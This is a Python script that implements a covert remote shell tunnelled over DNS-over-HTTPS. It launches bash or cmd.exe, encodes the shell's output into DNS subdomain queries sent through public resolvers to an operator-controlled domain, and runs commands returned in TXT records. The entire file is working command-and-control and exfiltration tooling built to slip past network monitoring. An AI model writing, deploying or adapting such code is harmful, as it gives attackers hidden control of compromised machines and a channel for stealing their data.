import socket
import subprocess
import sys
import threading
import requests
import queue
import base64
import time
from dohfinder import get_doh_providers

try:
    from dnslib import DNSRecord, DNSQuestion, QTYPE
    WIREFORMAT = True
    try: #build list dynmaically 
        dnsproviders = []
        for each in get_doh_providers():
            dnsproviders.append(each["url"] + "?dns=%DOMAIN")  #not all of them support this method
    except: #if error just use cloud flare
        print('Using hard coded cloudflare')
        dnsproviders = ["https://cloudflare-dns.com/dns-query?dns=%DOMAIN"]
    headers = {"accept" : "application/dns-message"}
except:
    print("If you want to support all DoH providers you'll need to install dnslib")
    WIREFORMAT = False
    dnsproviders = ["https://dns.google.com/resolve?name=%DOMAIN&type=TXT"]
    headers = {"accept" : "application/dns-json"}

dataqueue= queue.Queue()
sendqueue= queue.Queue()
senddns = "send.reyals.net"  #use your own domian send.example.com

maxlength = 63  #maxium length of a subdomain
sizeforsubdomains = 253 - len("." + senddns) #253 is max length of a full domain name
maxsize = sizeforsubdomains - int(sizeforsubdomains/maxlength) - 3 # we need to subtract all space used by . so we wend up with something like 63.63.63.44.send.example.com also including 3 chars for a length variable
maxbytesize = int((maxsize / 1.6) - ((maxsize / 1.6) % 5))  #taking account of the overhead of base32, what's the most data we can put in one query

def addouttoque(out, que):
    while 1:
        que.put(out.readline())

def processqueue(inque,outque):
    buffer = b""
    while not outque.empty():  #grab data from last loop
        buffer = buffer + outque.get_nowait()

    while not inque.empty():  #grab some new data from the queue
        nextitem = inque.get_nowait()
        buffer = buffer + nextitem
        if len(buffer) >= maxbytesize:  #enough to send; start processing
            break
    
    if len(buffer) > maxbytesize:
        outque.put(buffer[maxbytesize:])  #save for next loop
        buffer = buffer[0:maxbytesize]

    if len(buffer) == 0: #nothing to send
        return buffer
    answer = base64.b32encode(buffer).replace(b"=", b"")  #base 32 encode it and trim any = padding
    answer = (str(len(answer) + 3).zfill(3)).encode() + answer #add the length of the message to start of domains so we can weed out BS queries
    #break the answer up so none of the subdomains are longer then maxlength
    subdomains = round(len(answer)/maxlength - .5)
    for i in range(1, subdomains + 1):
        answer = answer[0:i*maxlength] + b"." + answer[i*maxlength:]
    return answer.lower()


if "linux" in sys.platform:
    p = subprocess.Popen(["/bin/bash", "-i"], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, bufsize = 1)
elif "win" in sys.platform:
    p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, bufsize = 1)
else:
    print("not sure of OS?")
    print(sys.platform)
    exit(1)

t = threading.Thread(target = addouttoque, args = (p.stdout, dataqueue))
t.daemon = True 
t.start()

#if you want stderr as well.
#t2 = threading.Thread(target = addouttoque, args = (p.stderr, dataqueue))
#t2.daemon = True 
#t2.start()


while 1:
    tosend = processqueue(dataqueue, sendqueue) #do we have anything to send
    if len(tosend) == 0:
        time.sleep(5)  #5 seconds seems to avoid caching of results
        domaintoquery = senddns
    else:
        domaintoquery = tosend.decode("ascii") + "." + senddns
    if WIREFORMAT:
        temp = DNSRecord(q=DNSQuestion(domaintoquery, QTYPE.TXT)) #format question
        query = base64.b64encode(temp.pack()).decode("ascii") #and base64 encode it for GET request
    else:
        query = domaintoquery
    while True:
        if len(dnsproviders) == 0:
            raise Exception("Out of Providers")
        try:
            provider = dnsproviders[round(time.time())%len(dnsproviders)]
            resp = requests.get(provider.replace("%DOMAIN", query), headers = headers)
            if resp.status_code != 200:
                raise Exception("Provider doesnt like us")
            if WIREFORMAT:
                if len(DNSRecord.parse(resp.content).rr) == 0:
                    raise Exception("Not the answer I was expecting")  #server could be down... but I'm going to assume it's their fault
                command = (DNSRecord.parse(resp.content).rr.pop().rdata.data[0]).decode("ascii")
            else:
                if not 'Answer' in resp.json():
                    raise Exception("Not the answer I was expecting")  #server could be down... but I'm going to assume it's their fault
                command = resp.json()["Answer"][0]["data"].strip('"')
            break
        except:
            print("Error from " + dnsproviders.pop(dnsproviders.index(provider)) + " removing them")
    
    if command == "ACK": #no action to take
        continue

    try:
        cmd = base64.b64decode(command) #if fails to decode will just trigger exception
        print("Command received:" + cmd.decode("ascii"))
        if cmd.decode("ascii") == "exit\n":
            print("exiting")
            break
        p.stdin.write(cmd)
        p.stdin.flush()
    except:
        pass
        #print("Not a command:" + command)

    time.sleep(1)

exit(0)